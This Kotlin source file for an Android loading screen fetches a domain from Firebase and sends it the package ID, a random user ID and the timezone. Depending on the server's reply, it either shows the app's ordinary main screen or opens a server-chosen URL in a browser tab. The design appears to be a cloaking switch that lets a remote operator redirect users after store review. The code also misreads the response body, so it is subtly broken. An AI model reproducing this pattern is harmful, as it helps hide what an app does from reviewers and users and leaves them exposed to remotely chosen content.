package com.template

import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.util.Patterns
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.template.MainActivity.Companion.IS_STARTED_UP
import com.template.MainActivity.Companion.SERVER_URL
import com.template.databinding.ActivityLoadingBinding
import okhttp3.*
import java.io.IOException
import java.util.*

class LoadingActivity : AppCompatActivity() {

    private lateinit var binding: ActivityLoadingBinding
    private lateinit var preferences: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        preferences = getSharedPreferences(MainActivity.APP_SETTINGS, MODE_PRIVATE)

        Firebase.database.reference.addValueEventListener(object : ValueEventListener {

            override fun onDataChange(snapshot: DataSnapshot) {
                val domain = snapshot.value.toString()
                preferences.edit().putBoolean(IS_STARTED_UP, true).apply()
                if (snapshot.value != null) getUrl(domain) else {
                    startActivity(Intent(this@LoadingActivity, MainActivity::class.java))
                }
            }

            override fun onCancelled(error: DatabaseError) {
                startActivity(Intent(this@LoadingActivity, MainActivity::class.java))
            }
        })
    }

    private fun getUrl(domain: String) {
        val matcher = Patterns.WEB_URL.matcher(domain)
        if (matcher.find()) {
            FIREBASE_DOMAIN = matcher.group()
            val url ="$FIREBASE_DOMAIN/?packageid=$PACKAGE_ID&usserid=$USER_ID&getz=$TIMEZONE_VALUE&getr=utm_source=google-play&utm_medium=organic"
            getData(url)
        }
    }

    private fun getData(url: String) {
        val request = Request.Builder().url(url).build()
        val client = OkHttpClient()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.d("TEST", e.message.toString())
            }

            override fun onResponse(call: Call, response: Response) {
                when(response.code()) {
                    403 -> startActivity(Intent(this@LoadingActivity, MainActivity::class.java))
                    200 -> {
                        preferences.edit().putString(SERVER_URL, response.body().toString()).apply()
                        CustomTabsIntent.Builder().build().launchUrl(this@LoadingActivity, Uri.parse(response.body().toString()))
                    }
                }
            }
        })
    }

    companion object {
        private var FIREBASE_DOMAIN = ""
        private const val PACKAGE_ID = BuildConfig.APPLICATION_ID
        private val TIMEZONE_VALUE = TimeZone.getDefault().id
        private var USER_ID = UUID.randomUUID()
    }
}